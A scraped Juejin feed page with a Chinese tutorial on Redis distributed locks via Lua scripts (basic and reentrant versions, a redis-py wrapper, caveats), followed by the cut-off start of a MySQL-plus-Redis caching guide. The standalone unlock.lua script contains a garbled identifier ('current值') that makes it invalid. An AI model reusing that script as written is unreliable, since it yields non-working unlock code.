            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哈里谢顿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:07:33.000Z" title="Thu Jan 01 2026 08:07:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Redis 中使用 <strong>Lua 脚本实现分布式锁</strong> 是一种高效、原子、安全的方式。由于 Lua 脚本在 Redis 中是<strong>单线程、原子执行</strong>的，可以避免多个客户端在加锁/解锁时出现竞态条件（Race Condition）。</p>
<p>下面将为你提供一个 <strong>完整、生产可用的 Redis 分布式锁 Lua 实现方案</strong>，包含：</p>
<ul>
<li>加锁（lock）</li>
<li>解锁（unlock）</li>
<li>自动续期（可选）</li>
<li>防止误删他人锁</li>
<li>支持可重入（可选）</li>
</ul>
<hr/>
<h2 data-id="heading-0">✅ 一、核心设计原则</h2>
<ol>
<li><strong>锁的唯一标识</strong>：每个客户端使用唯一的 <code>value</code>（如 UUID）作为锁标识，防止 A 客户端释放 B 客户端的锁。</li>
<li><strong>原子性操作</strong>：加锁和解锁必须通过 Lua 脚本保证原子性。</li>
<li><strong>自动过期</strong>：设置 TTL（如 30 秒），防止死锁。</li>
<li><strong>可重入支持（可选）</strong> ：同一个客户端可多次加锁（需记录重入次数）。</li>
</ol>
<blockquote>
<p>本文先实现 <strong>基础版（不可重入）</strong> ，再给出 <strong>可重入增强版</strong>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">✅ 二、基础版：不可重入分布式锁</h2>
<h3 data-id="heading-2">🔐 1. 加锁脚本（<code>lock.lua</code>）</h3>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- KEYS[1] = 锁的 key（如 "my_lock"）</span>
<span class="hljs-comment">-- ARGV[1] = 锁的 value（唯一标识，如 UUID）</span>
<span class="hljs-comment">-- ARGV[2] = 过期时间（毫秒，如 "30000"）</span>

<span class="hljs-keyword">local</span> key = KEYS[<span class="hljs-number">1</span>]
<span class="hljs-keyword">local</span> value = ARGV[<span class="hljs-number">1</span>]
<span class="hljs-keyword">local</span> ttl = <span class="hljs-built_in">tonumber</span>(ARGV[<span class="hljs-number">2</span>])

<span class="hljs-comment">-- 尝试加锁：只有当 key 不存在时才设置成功</span>
<span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">"SET"</span>, key, value, <span class="hljs-string">"NX"</span>, <span class="hljs-string">"PX"</span>, ttl) <span class="hljs-keyword">then</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>  <span class="hljs-comment">-- 加锁成功</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment">-- 加锁失败（已被占用）</span>
<span class="hljs-keyword">end</span>
</code></pre>
<blockquote>
<p>✅ <code>SET key value NX PX ttl</code> 是 Redis 2.6.12+ 的原子命令：</p>
<ul>
<li><code>NX</code>：仅当 key 不存在时设置</li>
<li><code>PX</code>：设置过期时间（毫秒）</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-3">🔓 2. 解锁脚本（<code>unlock.lua</code>）</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- KEYS[1] = 锁的 key</span>
<span class="hljs-comment">-- ARGV[1] = 锁的 value（用于验证是否是自己的锁）</span>

<span class="hljs-keyword">local</span> key <span class="hljs-operator">=</span> KEYS[<span class="hljs-number">1</span>]
<span class="hljs-keyword">local</span> <span class="hljs-keyword">value</span> <span class="hljs-operator">=</span> ARGV[<span class="hljs-number">1</span>]

<span class="hljs-comment">-- 获取当前锁的 value</span>
<span class="hljs-keyword">local</span> current_value <span class="hljs-operator">=</span> redis.call("GET", key)

<span class="hljs-comment">-- 如果存在且等于自己的 value，则删除</span>
if <span class="hljs-keyword">current</span>值 <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">then</span>
    redis.call("DEL", key)
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>  <span class="hljs-comment">-- 解锁成功</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment">-- 不是自己的锁，拒绝删除</span>
<span class="hljs-keyword">end</span>
</code></pre>
<blockquote>
<p>⚠️ 注意：不能直接 <code>DEL</code>，否则可能误删别人的锁！</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">✅ 三、Python 示例（使用 redis-py）</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> redis
<span class="hljs-keyword">import</span> uuid
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># 初始化 Redis 连接</span>
r = redis.StrictRedis(host=<span class="hljs-string">'localhost'</span>, port=<span class="hljs-number">6379</span>, decode_responses=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># 加载 Lua 脚本（推荐使用 script_load + evalsha 提高性能）</span>
lock_script = r.register_script(<span class="hljs-string">"""
if redis.call("SET", KEYS[1], ARGV[1], "NX", "PX", ARGV[2]) then
    return 1
else
    return 0
end
"""</span>)

unlock_script = r.register_script(<span class="hljs-string">"""
if redis.call("GET", KEYS[1]) == ARGV[1] then
    return redis.call("DEL", KEYS[1])
else
    return 0
end
"""</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">acquire_lock</span>(<span class="hljs-params">lock_name, acquire_timeout=<span class="hljs-number">10</span>, lock_timeout=<span class="hljs-number">30</span></span>):
    <span class="hljs-string">"""获取分布式锁"""</span>
    identifier = <span class="hljs-built_in">str</span>(uuid.uuid4())
    lock_timeout_ms = <span class="hljs-built_in">int</span>(lock_timeout * <span class="hljs-number">1000</span>)
    end_time = time.time() + acquire_timeout

    <span class="hljs-keyword">while</span> time.time() &lt; end_time:
        <span class="hljs-comment"># 执行 Lua 脚本尝试加锁</span>
        <span class="hljs-keyword">if</span> lock_script(keys=[lock_name], args=[identifier, lock_timeout_ms]):
            <span class="hljs-keyword">return</span> identifier  <span class="hljs-comment"># 返回锁标识</span>
        time.sleep(<span class="hljs-number">0.01</span>)  <span class="hljs-comment"># 短暂等待后重试</span>

    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">release_lock</span>(<span class="hljs-params">lock_name, identifier</span>):
    <span class="hljs-string">"""释放分布式锁"""</span>
    unlock_script(keys=[lock_name], args=[identifier])

<span class="hljs-comment"># ===== 使用示例 =====</span>
lock_key = <span class="hljs-string">"order:123:lock"</span>

<span class="hljs-comment"># 尝试获取锁</span>
lock_id = acquire_lock(lock_key, acquire_timeout=<span class="hljs-number">5</span>, lock_timeout=<span class="hljs-number">30</span>)
<span class="hljs-keyword">if</span> lock_id:
    <span class="hljs-keyword">try</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ 获取锁成功，执行业务逻辑..."</span>)
        time.sleep(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 模拟业务处理</span>
    <span class="hljs-keyword">finally</span>:
        <span class="hljs-comment"># 释放锁</span>
        release_lock(lock_key, lock_id)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"🔓 锁已释放"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ 获取锁超时"</span>)
</code></pre>
<hr/>
<h2 data-id="heading-5">✅ 四、增强版：支持可重入锁（Reentrant Lock）</h2>
<blockquote>
<p>适用于同一线程/协程需要多次进入临界区的场景。</p>
</blockquote>
<h3 data-id="heading-6">设计思路：</h3>
<ul>
<li>
<p>使用 <strong>Hash 结构</strong> 存储锁：</p>
<ul>
<li>field = 客户端 ID（UUID）</li>
<li>value = 重入次数（counter）</li>
</ul>
</li>
<li>
<p>设置整体 TTL</p>
</li>
</ul>
<h3 data-id="heading-7">🔐 可重入加锁脚本（<code>reentrant_lock.lua</code>）</h3>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- KEYS[1] = 锁 key</span>
<span class="hljs-comment">-- ARGV[1] = 客户端 ID</span>
<span class="hljs-comment">-- ARGV[2] = 锁过期时间（毫秒）</span>

<span class="hljs-keyword">local</span> key = KEYS[<span class="hljs-number">1</span>]
<span class="hljs-keyword">local</span> client_id = ARGV[<span class="hljs-number">1</span>]
<span class="hljs-keyword">local</span> ttl = <span class="hljs-built_in">tonumber</span>(ARGV[<span class="hljs-number">2</span>])

<span class="hljs-comment">-- 检查是否已持有锁</span>
<span class="hljs-keyword">local</span> current_client = redis.call(<span class="hljs-string">"HGET"</span>, key, client_id)

<span class="hljs-keyword">if</span> current_client <span class="hljs-keyword">then</span>
    <span class="hljs-comment">-- 已持有：重入次数 +1，刷新 TTL</span>
    redis.call(<span class="hljs-string">"HINCRBY"</span>, key, client_id, <span class="hljs-number">1</span>)
    redis.call(<span class="hljs-string">"PEXPIRE"</span>, key, ttl)
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-comment">-- 未持有：尝试获取锁</span>
    <span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">"HLEN"</span>, key) == <span class="hljs-number">0</span> <span class="hljs-keyword">then</span>
        <span class="hljs-comment">-- 锁空闲，创建</span>
        redis.call(<span class="hljs-string">"HMSET"</span>, key, client_id, <span class="hljs-number">1</span>)
        redis.call(<span class="hljs-string">"PEXPIRE"</span>, key, ttl)
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-comment">-- 锁被他人持有</span>
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">end</span>
<span class="hljs-keyword">end</span>
</code></pre>
<h3 data-id="heading-8">🔓 可重入解锁脚本（<code>reentrant_unlock.lua</code>）</h3>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- KEYS[1] = 锁 key</span>
<span class="hljs-comment">-- ARGV[1] = 客户端 ID</span>

<span class="hljs-keyword">local</span> key = KEYS[<span class="hljs-number">1</span>]
<span class="hljs-keyword">local</span> client_id = ARGV[<span class="hljs-number">1</span>]

<span class="hljs-comment">-- 检查是否持有锁</span>
<span class="hljs-keyword">local</span> counter = redis.call(<span class="hljs-string">"HGET"</span>, key, client_id)

<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> counter <span class="hljs-keyword">then</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment">-- 未持有锁</span>
<span class="hljs-keyword">end</span>

counter = <span class="hljs-built_in">tonumber</span>(counter)

<span class="hljs-keyword">if</span> counter &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">then</span>
    <span class="hljs-comment">-- 重入次数 &gt;1，减1</span>
    redis.call(<span class="hljs-string">"HINCRBY"</span>, key, client_id, <span class="hljs-number">-1</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-comment">-- 最后一次，删除整个 key</span>
    redis.call(<span class="hljs-string">"DEL"</span>, key)
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
<span class="hljs-keyword">end</span>
</code></pre>
<blockquote>
<p>💡 使用方式与基础版类似，只需替换 Lua 脚本。</p>
</blockquote>
<hr/>
<h2 data-id="heading-9">✅ 五、注意事项与最佳实践</h2>

























<table><thead><tr><th>问题</th><th>解决方案</th></tr></thead><tbody><tr><td><strong>锁过期但业务未完成</strong></td><td>使用“看门狗”（Watchdog）线程自动续期（如 Redisson 的机制）</td></tr><tr><td><strong>主从切换导致锁丢失</strong></td><td>使用 Redlock 算法（多 Redis 实例），但争议较大；更推荐强一致存储（如 etcd）</td></tr><tr><td><strong>Lua 脚本调试困难</strong></td><td>在开发环境打印日志（<code>redis.log(redis.LOG_WARNING, "msg")</code>）</td></tr><tr><td><strong>性能优化</strong></td><td>使用 <code>SCRIPT LOAD</code> + <code>EVALSHA</code> 避免每次传输脚本</td></tr></tbody></table>
<blockquote>
<p>📌 <strong>重要提醒</strong>：<br/>
Redis 分布式锁 <strong>不保证绝对安全</strong>（尤其在主从异步复制场景）。<br/>
对一致性要求极高的场景（如金融），建议使用 <strong>etcd / ZooKeeper</strong>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-10">✅ 六、总结</h2>



































<table><thead><tr><th>功能</th><th>基础版</th><th>可重入版</th></tr></thead><tbody><tr><td>原子加锁</td><td>✅</td><td>✅</td></tr><tr><td>防止误删</td><td>✅</td><td>✅</td></tr><tr><td>自动过期</td><td>✅</td><td>✅</td></tr><tr><td>同客户端多次加锁</td><td>❌</td><td>✅</td></tr><tr><td>复杂度</td><td>低</td><td>中</td></tr></tbody></table>
<blockquote>
<p><strong>推荐</strong>：</p>
<ul>
<li>普通场景 → 用 <strong>基础版</strong></li>
<li>需要递归调用/嵌套锁 → 用 <strong>可重入版</strong></li>
</ul>
</blockquote>
<hr/>
<p>通过以上 Lua 脚本 + 客户端封装，你可以在 Redis 中实现一个<strong>高效、安全、可靠</strong>的分布式锁系统。如果需要 <strong>Go / Java / Node.js 版本的客户端实现</strong>，也可以告诉我！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL 和 Redis搭配使用指南]]></title>    <link>https://juejin.cn/post/7589935326781751330</link>    <guid>https://juejin.cn/post/7589935326781751330</guid>    <pubDate>2026-01-01T08:13:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589935326781751330" data-draft-id="7589920318132781056" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQL 和 Redis搭配使用指南"/> <meta itemprop="keywords" content="Redis,MySQL"/> <meta itemprop="datePublished" content="2026-01-01T08:13:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哈里谢顿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQL 和 Redis搭配使用指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哈里谢顿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:13:55.000Z" title="Thu Jan 01 2026 08:13:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>MySQL 和 Redis 是现代应用架构中经典的 <strong>“持久存储 + 高速缓存”</strong> 组合。它们各自优势互补：</p>
<ul>
<li><strong>MySQL</strong>：强一致性、事务支持、持久化，适合存储核心业务数据（如用户信息、订单）。</li>
<li><strong>Redis</strong>：内存数据库、微秒级响应、丰富数据结构，适合缓存热点数据、会话、排行榜等。</li>
</ul>
<hr/>
<h2 data-id="heading-0">✅ 一、典型搭配模式</h2>





























<table><thead><tr><th>场景</th><th>策略</th></tr></thead><tbody><tr><td><strong>读多写少的数据</strong>（如商品详情）</td><td>先查 Redis，命中则返回；未命中查 MySQL，再写入 Redis</td></tr><tr><td><strong>写操作</strong>（如更新用户资料）</td><td>先更新 MySQL，再删除/更新 Redis 中的缓存（<strong>Cache-Aside Pattern</strong>）</td></tr><tr><td><strong>防止缓存穿透</strong></td><td>对空结果也缓存（短 TTL），或使用布隆过滤器</td></tr><tr><td><strong>防止缓存雪崩</strong></td><td>设置随机过期时间</td></tr><tr><td><strong>防止缓存击穿</strong></td><td>对热点 key 使用互斥锁（如 Redis 分布式锁）</td></tr></tbody></table>
<blockquote>
<p>📌 <strong>核心原则</strong>：<strong>以 MySQL 为唯一真实数据源，Redis 仅为缓存</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-1">✅ 二、Python 实战示例（使用 <code>pymysql</code> + <code>redis-py</code>）</h2>
<h3 data-id="heading-2">1. 安装依赖</h3>
<pre><code class="hljs">pip install pymysql redis
</code></pre>
<h3 data-id="heading-3">2. 初始化连接</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> redis
<span class="hljs-keyword">import</span> pymysql
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager

<span class="hljs-comment"># Redis 连接（带连接池）</span>
redis_client = redis.Redis(
    host=<span class="hljs-string">'localhost'</span>,
    port=<span class="hljs-number">6379</span>,
    decode_responses=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># 自动解码 bytes 为 str</span>
    socket_connect_timeout=<span class="hljs-number">2</span>,
    socket_timeout=<span class="hljs-number">2</span>
)

<span class="hljs-comment"># MySQL 连接配置</span>
DB_CONFIG = {
    <span class="hljs-string">'host'</span>: <span class="hljs-string">'localhost'</span>,
    <span class="hljs-string">'user'</span>: <span class="hljs-string">'root'</span>,
    <span class="hljs-string">'password'</span>: <span class="hljs-string">'your_password'</span>,
    <span class="hljs-string">'database'</span>: <span class="hljs-string">'blog_db'</span>,
    <span class="hljs-string">'charset'</span>: <span class="hljs-string">'utf8mb4'</span>,
    <span class="hljs-string">'cursorclass'</span>: pymysql.cursors.DictCursor
}

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db_connection</span>():
    conn = pymysql.connect(**DB_CONFIG)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span> conn
    <span class="hljs-keyword">finally</span>:
        conn.close()
</code></pre>
<hr/>
<h3 data-id="heading-4">3. 缓存策略实现：<strong>Cache-Aside（旁路缓存）</strong></h3>
<h4 data-id="heading-5">📌 场景：根据用户 ID 获取用户信息</h4>
<pre><code class="hljs language-python" lang="python">CACHE_PREFIX = <span class="hljs-string">"user:"</span>
CACHE_TTL = <span class="hljs-number">300</span>  <span class="hljs-comment"># 5分钟</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span></span>):
    <span class="hljs-string">"""从缓存或数据库获取用户"""</span>
    cache_key = <span class="hljs-string">f"<span class="hljs-subst">{CACHE_PREFIX}</span><span class="hljs-subst">{user_id}</span>"</span>
    
    <span class="hljs-comment"># 1. 先查 Redis</span>
    cached = redis_client.get(cache_key)
    <span class="hljs-keyword">if</span> cached <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
